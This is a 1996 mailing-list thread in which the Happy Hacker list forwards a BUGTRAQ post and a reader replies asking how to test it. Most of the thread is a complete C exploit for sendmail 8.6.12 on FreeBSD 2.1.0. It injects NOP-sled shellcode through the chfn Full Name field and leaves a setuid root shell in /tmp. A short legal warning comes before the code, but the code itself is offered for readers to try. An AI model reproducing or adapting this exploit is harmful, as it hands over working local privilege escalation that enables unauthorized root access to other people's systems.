Happy hackers, please note. If you try out the way to exploit the sendmail 
bug as described below, and you succeed and gain root access to the 
computer of someone who does not consent to your experiment, you will be 
breaking the law. To test out this hack, get a friend who has Linux to let 
you experiment. Or -- install your own version!

I have two extra CD-ROMs with Slackware Linux. I will mail them to the 
first two people who email me their snail mail addresses.

Carolyn Meinel 
M/B Research -- The Technology Brokers

---------- Forwarded message ---------- 
Date: Mon, 23 Sep 1996 10:56:39 -0400 
From: Alexey Zakharov <leshka@chci.chuvashia.su> 
To: Multiple recipients of list BUGTRAQ <BUGTRAQ@netspace.org> 
Subject: Exploit for sendmail security hole (version 8.6.12 for FreeBSD 2.1.0)

/*                               Hi !                                       */ 
/* This is exploit for sendmail bug (version 8.6.12 for FreeBSD 2.1.0).     */ 
/* If you have any problems with it, send letter to me.                     */ 
/*                             Have fun !                                   */ 
 

/* -----------------   Dedicated to my beautiful lady   ------------------  */ 
/* Leshka Zakharoff, 1996. E-mail: leshka@chci.chuvashia.su                 */

#include <stdio.h> 
main() 
{ 
void make_files(); 
     make_files(); 
     system("EDITOR=./hack;export EDITOR;chmod +x hack;chfn;/usr/sbin/sendmail;echo See result in /tmp"); 
}

void make_files() 
 { 
  int i,j; 
  FILE *f; 
  char nop_string[200]; 
  char code_string[]= 
                      { 
                         "\xeb\x50"                         /* jmp    cont */

/* geteip: */            "\x5d"                             /* popl   %ebp */ 
                         "\x55"                             /* pushl  %ebp */ 
                         "\xff\x8d\xc3\xff\xff\xff"         /* decl   0xffffffc3(%ebp) */ 
                         "\xff\x8d\xd7\xff\xff\xff"         /* decl   0xffffffd7(%ebp) */ 
                         "\xc3"                             /* ret */

/* 0xffffffb4(%ebp): */ "cp /bin/sh /tmp" 
/* 0xffffffc3(%ebp): */ "\x3c" 
                        "chmod a=rsx /tmp/sh" 
/* 0xffffffd7(%ebp): */ "\x01" 
                        "-leshka-leshka-leshka-leshka-"    /* reserved */

/* cont:  */            "\xc7\xc4\x70\xcf\xbf\xef"         /* movl   $0xefbfcf70,%esp */ 
                        "\xe8\xa5\xff\xff\xff"             /* call   geteip */ 
                        "\x81\xc5\xb4\xff\xff\xff"         /* addl   $0xb4ffffff,%ebp */ 
                        "\x55"                             /* pushl  %ebp */ 
                        "\x55"                             /* pushl  %ebp */ 
                        "\x68\xd0\x77\x04\x08"             /* pushl  $0x80477d0  */ 
                        "\xc3"                             /* ret */ 
                        "-leshka-leshka-leshka-leshka-"    /* reserved */ 
                        "\xa0\xcf\xbf\xef" 
                     };

  j=269-sizeof(code_string); 
  for(i=0;i<j;nop_string[i++]='\x90'); 
  nop_string[j]='\0';

  f=fopen("user.inf","w"); 
  fprintf(f,"#Changing user database information for leshka\n"); 
  fprintf(f,"Shell: /usr/local/bin/bash\n"); 
  fprintf(f,"Location: \n"); 
  fprintf(f,"Office Phone: \n"); 
  fprintf(f,"Home Phone: \n"); 
  fprintf(f,"Full Name: %s%s\n",nop_string,code_string); 
  fclose(f);

  f=fopen("hack","w"); 
  fprintf(f,"cat user.inf>\"$1\"\n"); 
  fprintf(f,"touch -t 2510711313 \"$1\"\n"); 
  fclose(f); 
 } 
 

Wed Sep 25 21:06:37 1996 
From: Maddog Monk <cwlittl@odin.cmp.ilstu.edu> 
Subject: Re: HH: Happy Hacker: Exploit for sendmail security hole 
  (version 8.6.12 for FreeBSD 2.1.0) (fwd)

>I have two extra CD-ROMs with Slackware Linux. I will mail them to the 
>first two people who email me their snail mail addresses. 
> 
>Carolyn Meinel 
>M/B Research -- The Technology Brokers 
 

Did I make it for the CD-Roms? :)

Also, does that code you put in the msg have to be compiled on the 
machine you are testing for the sendmail bug? I would like to test 
my two RS/6000s for this bug.

Thanks!

               Maddog Monk. 
